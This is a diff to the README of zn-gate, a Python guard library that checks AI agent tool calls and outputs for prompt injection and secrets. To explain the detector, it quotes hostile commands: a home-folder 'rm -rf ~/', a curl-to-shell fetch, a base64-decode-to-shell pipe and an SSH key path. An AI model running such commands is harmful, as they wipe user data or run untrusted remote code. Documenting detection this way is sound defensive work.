@@ -14,15 +14,13 @@
 
 **For:** developers building their own agents with LangChain, CrewAI, LlamaIndex or plain Python tool calling.
 
-> **Using Claude Code, Codex CLI, Cursor, OpenCode, Antigravity or ZCode desktop app?** This Python package does not protect them. Run `npx -y zn-gate init` in your own terminal instead (it needs Node.js 18 or later; 22 LTS is recommended, and the Claude Code plugin needs 20.19 or later): see [Install](https://github.com/usezn/zn#install).
+> **Using Claude Code, Codex CLI, Cursor, OpenCode, Antigravity, ZCode desktop app, GitHub Copilot or the experimental Gemini CLI?** This Python package does not protect them. Run `npx -y zn-gate init` in your own terminal instead (it needs Node.js 18 or later; 22 LTS is recommended, and the Claude Code plugin needs 20.19 or later): see [Install](https://github.com/usezn/zn#install).
 
 ---
 
 ## Install
 
-Install it in a virtual environment. Many recent Linux systems, and Homebrew's Python on macOS, refuse `pip install` outside one, with an "externally-managed-environment" error:
-
-On Debian and Ubuntu, `python3 -m venv` needs the `python3-venv` package first: `sudo apt update && sudo apt install python3-venv`.
+Install it in a virtual environment. Many recent Linux systems, and Homebrew's Python on macOS, refuse `pip install` outside one, with an "externally-managed-environment" error. On Debian and Ubuntu, `python3 -m venv` also needs the `python3-venv` package first: `sudo apt update && sudo apt install python3-venv`.
 
 ```bash
 python3 -m venv .venv
@@ -31,6 +29,19 @@ python3 -m venv .venv
 ```
 
 `zn-gate` is installed inside the environment, so run it as shown, or run `source .venv/bin/activate` once in each terminal and then `zn-gate scan .` (Windows: `.venv\Scripts\activate`).
+
+No internet on this computer? See [Install on a machine without internet](https://github.com/usezn/zn/blob/main/docs/install-matrix.md#install-on-a-machine-without-internet). Those steps are for the npm package.
+
+**On Windows**, use the `py` launcher, which comes with Python from python.org and the Python install manager:
+
+```powershell
+py -m pip install zn-gate
+py -m zn_gate scan .
+```
+
+Run it as `py -m zn_gate`, not as `zn-gate`. `pip` installs the `zn-gate` command into the `Scripts` folder of your Python, and that folder is often not on your PATH, so a plain `zn-gate` can fail with "not recognized" even after a successful install. `py -m zn_gate` runs the same commands (`scan`, `test`, `status` and the rest) without needing that folder on your PATH. Replace `scan .` with the command you need, for example `py -m zn_gate status`.
+
+To keep zn-gate inside a project's virtual environment instead, run `py -m venv .venv`, then `.venv\Scripts\python -m pip install zn-gate` and `.venv\Scripts\python -m zn_gate scan .`.
 
 **Only the command-line tools (`scan`, `test`, `status`)?** Install the Python CLI as a standalone tool, without a virtual environment. On Ubuntu and Debian, first run `sudo apt update && sudo apt install pipx`. Bare `pip` is often missing there too (`pip: command not found`), and `pip install` into the system Python is refused, so use pipx, uv or a virtual environment. To get uv, follow the [official uv installation guide](https://docs.astral.sh/uv/getting-started/installation/):
 
@@ -42,19 +53,20 @@ zn-gate scan .
 
 `pipx ensurepath` puts `~/.local/bin` on your PATH. Until you reopen the terminal, `zn-gate` is reported as "command not found". With uv: `uv tool install zn-gate` (run `uv tool update-shell` if the command is not found). To run it once without installing: `uvx zn-gate scan .`
 
-The Python CLI does not install hooks. To protect Claude Code, Codex CLI, Cursor, OpenCode, Antigravity or ZCode desktop app, run `npx -y zn-gate init` (Node 18 or later).
+The Python CLI does not install hooks. To protect Claude Code, Codex CLI, Cursor, OpenCode, Antigravity, ZCode desktop app or GitHub Copilot (or the experimental Gemini CLI), run `npx -y zn-gate init` (Node 18 or later).
 
 Inside an environment you already use (your project's virtualenv, Poetry, uv), `pip install zn-gate` is enough. Python 3.10 or later (CI tests 3.10 to 3.14). Zero runtime dependencies.
 
 **If something fails:**
 
 - `externally-managed-environment`: install it in a virtual environment, as shown above.
+- `pip` or `zn-gate` is "not recognized" on Windows: use `py -m pip install zn-gate` and `py -m zn_gate scan .`.
 - `pip: command not found` or `No module named pip`: this system has no pip for its Python. Use the virtual environment or pipx steps above.
 - `zn-gate: command not found` after a virtual environment install: run `.venv/bin/zn-gate scan .`, or run `source .venv/bin/activate` first.
 - `python3 -m venv` fails on Debian or Ubuntu: run `sudo apt update && sudo apt install python3-venv`.
 - Python says it cannot find `zn_gate`: run your script with the Python of that environment (`.venv/bin/python`; Windows: `.venv\Scripts\python`).
 - Legitimate content is blocked: use `on_block="return"` with a fallback while you evaluate it.
-- You use Claude Code, Codex CLI, Cursor, OpenCode, Antigravity or ZCode desktop app: this package does not protect them. Run `npx -y zn-gate init` in your own terminal instead.
+- You use Claude Code, Codex CLI, Cursor, OpenCode, Antigravity, ZCode desktop app, GitHub Copilot or the experimental Gemini CLI: this package does not protect them. Run `npx -y zn-gate init` in your own terminal instead.
 
 ## Check that it works
 
@@ -96,8 +108,8 @@ print(r.verdict)           # allow
 
 **Galvanize: prompt-injection detection**
 
-- Today, local: `evaluate`, `check_tool_call`, `check_tool_result` and `@guard` run a deterministic rules engine with normalization against homoglyphs, zero-width characters, BiDi overrides, comment splicing and Base64.
-- Today, optional cloud: `analyze()` can also query the Galvanize 3 classifier ([announcement](https://usezn.com/blog/galvanize-3-is-live-in-the-zn-api/?utm_source=pypi&utm_medium=readme&utm_campaign=galvanize-3); the previous model, [Galvanize 2](https://huggingface.co/usezn/Galvanize-2), has open weights under Apache-2.0), only with `ZN_CLOUD=1` and `ZN_API_KEY`.
+- Today, local: `evaluate`, `check_tool_call`, `check_tool_result` and `@guard` run a deterministic rules engine with normalization against homoglyphs, zero-width characters, BiDi overrides and comment splicing. Shell commands that decode Base64 text and run it (for example `... | base64 -d | sh`) are recognised; a Base64 string on its own is not decoded.
+- Today, optional cloud: `analyze()` can also query the Galvanize 3 classifier ([open weights on Hugging Face](https://huggingface.co/usezn/Galvanize-3); [announcement](https://usezn.com/blog/galvanize-3-is-live-in-the-zn-api/?utm_source=pypi&utm_medium=readme&utm_campaign=galvanize-3); the previous model, [Galvanize 2](https://huggingface.co/usezn/Galvanize-2), also has open weights under Apache-2.0), only with `ZN_CLOUD=1` and `ZN_API_KEY`.
 - Roadmap: running Galvanize locally.
 
 **Scan: audit what your agent is about to trust**
@@ -111,7 +123,7 @@ print(r.verdict)           # allow
 
 **Nothing, by default.** `evaluate`, `guard`, `check_tool_call`, `check_tool_result`, `sanitize_tool_result`, `redact_secrets` and the LangChain / CrewAI / LlamaIndex / Promptfoo integrations are always local.
 
-The only function that can reach the network is `analyze()`, and only if you set **both** `ZN_CLOUD=1` and `ZN_API_KEY`. The text is secret-redacted locally before it is sent: personal data, and a secret zn-gate does not recognize, is sent as written. If the cloud call fails, `analyze()` returns the result of the local rules with `fallback: True`: it does not fail closed. `ZN_API_KEY` alone enables nothing, and `ZN_LOCAL_ONLY=true` overrides `ZN_CLOUD=1`. `zn-gate status` shows the active detection engine and whether the optional cloud check is on. Sharing of usage statistics is off by default and has its own status in the npm package: `npx -y zn-gate stats share status`. Data-flow diagrams: [repository README](https://github.com/usezn/zn#what-leaves-your-machine).
+The only function that can reach the network is `analyze()`, and only if you set **both** `ZN_CLOUD=1` and `ZN_API_KEY`. The text is secret-redacted locally before it is sent: personal data, and a secret zn-gate does not recognize, is sent as written. If the cloud call fails, `analyze()` returns the result of the local rules with `fallback: True` (the [status page](https://usezn.com/status?utm_source=pypi&utm_medium=readme&utm_campaign=status) shows whether the service is down): it does not fail closed. One exception: if the service answers but its verdict is neither allow nor block, the text is blocked (rule `cloud:unknown-verdict`), because zn-gate cannot tell what the service meant. If the cloud answers but its model is unavailable, `analyze()` keeps the cloud verdict and adds `degraded: True` and `degraded_reason`, because the cloud gate decided from its rules alone. `ZN_API_KEY` alone enables nothing, and `ZN_LOCAL_ONLY=true` overrides `ZN_CLOUD=1`. `zn-gate status` shows the active detection engine and whether the optional cloud check is on. Sharing of usage statistics is off by default and has its own status in the npm package: `npx -y zn-gate stats share status`. Data-flow diagrams: [repository README](https://github.com/usezn/zn#what-leaves-your-machine).
 
 A long text (over 1,000 characters) is checked by the cloud classifier in overlapping 512-token windows, up to 20, so an injection in the middle or at the end of a long document is not missed. Set `ZN_LONG_INPUT=off` (or `analyze(..., long_input="off")`, `zn-gate analyze --long-input off`) to check only the first 512 tokens, as before. Cloud checks are billed by text size, with or without windows (`off` does not lower the count): 1 call up to 2,000 characters, and 1 more for each further 1,000 characters or part of them (up to 19 calls for the 20,000-character limit); the gate reports the count in `billed_calls`.
 
@@ -139,7 +151,7 @@ Arguments are checked before the function runs; with `on_block="raise"` a blocke
 
 `on_block="return"` returns `fallback` instead of running the function. `on_block="custom"` calls `callback(assessment, function_name, payload)` and then raises `GuardBlockError`, unless your callback raises its own exception first; it needs a `callback`, and without one the decorator raises `ValueError`. In every mode a blocked call does not run the function.
 
-The checks read every string inside the arguments: dict keys and values, lists, tuples, sets, dataclasses, pydantic models and the attributes of other objects (the `self` or `cls` of a method is skipped). The run-context objects that agent frameworks pass to a tool (pydantic-ai `RunContext`, Google ADK `ToolContext`, OpenAI Agents SDK `ToolContext` and `RunContextWrapper`, LangChain callback managers and `RunnableConfig`) are not checked, and, in the `@guard` decorator, other application objects (a client, a session, your dependencies) are read best effort: what is nested too deep to read is left out instead of blocking the call. `check_tool_call` and the framework integrations read every object in full and block what they cannot (rules `size:nesting`, `type:unscannable`, `size:items`), like the npm package. Data models (dataclasses, pydantic, attrs) are always read in full. A generator or other one-shot iterator is blocked (rule `type:unscannable`), because checking it would use it up: pass a list instead. Strings longer than 256 KB are checked in overlapping windows up to 4 MB; past that the result has `truncated=True`, and `block_truncated=True` or `ZN_BLOCK_TRUNCATED=1` blocks it (rule `size:truncated`).
+The checks read every string inside the arguments: dict keys and values, lists, tuples, sets, dataclasses, pydantic models and the attributes of other objects (the `self` or `cls` of a method is skipped). The run-context objects that agent frameworks pass to a tool (pydantic-ai `RunContext`, Google ADK `ToolContext`, OpenAI Agents SDK `ToolContext` and `RunContextWrapper`, LangChain callback managers and `RunnableConfig`) are not checked, and, in the `@guard` decorator, other application objects (a client, a session, your dependencies) are read best effort: what is nested too deep to read is left out instead of blocking the call. `check_tool_call` and the framework integrations read every object in full and block what they cannot (rules `size:nesting`, `type:unscannable`, `size:items`), like the npm package. Data models (dataclasses, pydantic, attrs) are always read in full. A generator or other one-shot iterator is blocked (rule `type:unscannable`), because checking it would use it up: pass a list instead. Strings longer than 256 KB are checked in overlapping windows up to 4 MB. An argument string over 4 MB is always blocked (rule `size:oversize`); a tool result over 4 MB is blocked by default too (rule `size:truncated`), unless you set `ZN_ALLOW_TRUNCATED=1` (see Configuration). `block_truncated=True` or `ZN_BLOCK_TRUNCATED=1` keeps a result blocked even then.
 
 #### Async tools, streamed output and errors
 
@@ -150,9 +162,21 @@ With `check_result` or `mask_secrets` (both on by default in `guarded_tool`), `@
 - **Objects**: a result that is a pydantic model, a dataclass or another plain object is read field by field. With `mask_secrets` a secret inside it is masked, and the model gets the object as plain data (a dict) with the secret hidden. A secret that cannot be masked blocks the result (rule `secret:unmaskable`).
 - **Errors**: agent frameworks send the message of a tool's exception to the model (LangChain `handle_tool_error`, LangGraph `ToolNode`, the OpenAI Agents SDK, CrewAI), so it is checked and masked like the output. A blocked message raises `GuardBlockError` (or returns the `fallback`). A message with a secret is raised again as an exception of the same type that carries only the masked message, without the original exception attached; when the type cannot be rebuilt that way, `zn_gate.guard.MaskedToolError` (a `RuntimeError`) is raised instead. Other exceptions are raised unchanged.
 
-`@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
+`@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. To check a shell command, call `check_command` yourself before you run it. It looks at one command (Bash, sh, zsh or PowerShell text) for destructive shapes such as a recursive delete of the home folder or the root, or a write to a disk device, and works offline:
+
+```python
+from zn_gate import check_command
+
+print(check_command("ls -la /tmp/example").verdict)  # allow
+a = check_command("rm -rf ~/")
+print(a.verdict, a.rule)                              # block destructive:rm_root_home
+```
+
+Only the rules listed in [Destructive commands](https://github.com/usezn/zn/blob/main/docs/destructive-commands.md) are checked, so decide in your own code which tools may delete files or run commands.
 
 Runnable example with Microsoft Semantic Kernel: [examples/semantic-kernel-agent](https://github.com/usezn/zn/tree/main/examples/semantic-kernel-agent).
+
+The secret-file check reads the text of a path only. It does not follow symbolic links and does not expand Windows short names (such as `PROGRA~1`), so a link or short name that points at a protected file is not recognised. Keep secrets in the zn vault (the npm package's `zn env shadow .env`) or outside the project folder.
 
 ### LangChain / LangGraph
 
@@ -166,7 +190,7 @@ handler = ZnGuardCallbackHandler(on_block="raise")
 # pass callbacks=[handler] to your agent, chain or tool
 ```
 
-The handler stops the run. With `on_block="raise"` (default) a blocked prompt, tool call or tool output raises `GuardBlockError` out of the agent: the tool does not run and the output does not reach the model. `on_block="ignore"` turns that off. `"return"` is not accepted (it raises `ValueError`), because LangChain ignores what a callback returns; any other value raises `ValueError` too.
+The handler stops the run. With `on_block="raise"` (default) a blocked prompt, tool call or tool output raises `GuardBlockError` out of the agent: the tool does not run and the output does not reach the model. `on_block="ignore"` turns that off: each blocked prompt, tool call, tool output, tool error or secret in a tool output that is let through is logged as a warning (logger `zn_gate`) with the rule and where it happened, never the text. `"return"` is not accepted (it raises `ValueError`), because LangChain ignores what a callback returns; any other value raises `ValueError` too.
 
 A callback cannot change what a tool returns. So with `mask_secrets=True` (default) a tool output that contains a secret also stops the run (it fails closed instead of letting the secret reach the model). The same goes for a tool's error, whose text LangChain (`handle_tool_error`) and LangGraph (`ToolNode(handle_tool_errors=True)`) send to the model: when the message is blocked or contains a secret, the handler replaces the error with `GuardBlockError`, whose message holds no secret. To hide the secret and keep going, or to give the model a block message instead of the output, wrap the tool (needs `langchain-core`):
 
@@ -250,7 +274,7 @@ safe_query = guard.on_query_start(user_query)
 clean_response = guard.sanitize_response(query_engine.query(safe_query))
 ```
 
-`on_block` accepts `"raise"` (default), `"return"` or `"ignore"`; any other value raises `ValueError`. With `"return"`, `on_query_start` returns `fallback`, or a short block message, in place of the query, so the engine never sees the blocked text. `sanitize_response` hides secrets in text, lists, dicts and in the text of a LlamaIndex `Response` (on a copy).
+`on_block` accepts `"raise"` (default), `"return"` or `"ignore"`; any other value raises `ValueError`. With `"return"`, `on_query_start` returns `fallback`, or a short block message, in place of the query, so the engine never sees the blocked text. `sanitize_response` hides secrets in text, lists, dicts and in the text of a LlamaIndex `Response` (on a copy). With `on_block="ignore"` (or `raise_on_violation=False`), a blocked query that is let through is logged as a warning (logger `zn_gate`) with the rule, never the text.
 
 For LlamaIndex tools, wrap the function with `guarded_tool` before `FunctionTool.from_defaults(fn=...)`: the arguments are checked before it runs and its output is checked and masked before the agent reads it (see the `llamaindex-agent` example).
 
@@ -262,7 +286,7 @@ providers:
     label: "zn-gate"
 ```
 
-### Local audit log
+### Local decision log
 
 <!-- snippet-test -->
 ```python
@@ -309,9 +333,13 @@ We only publish numbers we can reproduce, with the method next to them.
 - `ZN_API_KEY`: API key from [usezn.com/dashboard](https://usezn.com/dashboard/). No effect without `ZN_CLOUD=1`.
 - `ZN_LOCAL_ONLY`: `true` forces local-only.
 - `ZN_STRICT`: `1` also blocks the rules that only warn by default (same as `evaluate(text, strict=True)`; also `check_tool_call`, `check_tool_result` and `sanitize_tool_result` take `strict=True`).
+- `ZN_BLOCK_TRUNCATED`: `1` keeps a tool result too large to scan in full blocked (rule `size:truncated`), even when `ZN_ALLOW_TRUNCATED=1` is set. Any other value leaves it off and logs a warning (logger `zn_gate`) naming the accepted values.
+- `ZN_ALLOW_TRUNCATED`: `1` lets a tool result over 4 MB through, marked `truncated`, instead of blocking it. This weakens protection: the part of the output past the limit is never checked, so use it only for a tool you trust. It has no effect on arguments, which are always blocked over 4 MB.
+- `ZN_VERBOSE`: `1` (or `DEBUG=zn`) prints technical detail on the error output.
+- `ZN_HOME`: folder used instead of `~/.zn`. The Python package reads the usage counts there (`zn-gate stats`), written by the npm package, and keeps the evidence ledger there. In the npm package it also covers the hook settings (`config.json`) and the secret request list.
 - Project files: this package does not read `.znrules` or `zn.config.json`. Custom rules and the `strict` setting in those files apply only to the npm package (its CLI, agent hooks and Node.js library). In Python, turn strict mode on with `strict=True` or `ZN_STRICT=1`.
 - `ZN_STAGE` / `ZN_API_URL`: cloud endpoint selection.
-- `NO_COLOR` (any non-empty value) or `TERM=dumb`: the command line output leaves out its symbols; the status words (ALLOW, BLOCK, clean, ...) stay.
+- `NO_COLOR` (any non-empty value) or `TERM=dumb`: the command line output uses short ASCII markers such as `[ok]`, `[!]` and `[+]` in place of its symbols; the status words (ALLOW, BLOCK, clean, ...) stay. Piped output and runs with `CI` set (any non-empty value) use the same markers.
 
 ## Examples
 
@@ -326,6 +354,7 @@ Runnable examples for the Python package, in [`examples/`](https://github.com/us
 | [`openai-agents-sdk`](https://github.com/usezn/zn/tree/main/examples/openai-agents-sdk) | Python | OpenAI Agents SDK | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
 | [`pydantic-ai-agent`](https://github.com/usezn/zn/tree/main/examples/pydantic-ai-agent) | Python | Pydantic AI | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
 | [`google-adk-agent`](https://github.com/usezn/zn/tree/main/examples/google-adk-agent) | Python | Google ADK | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
+| [`ag2-agent`](https://github.com/usezn/zn/tree/main/examples/ag2-agent) | Python | AG2 | Check what a tool returns before the model reads it: a page that gives the model orders is replaced by a notice, and a secret in it is hidden. |
 
 ## FAQ
 
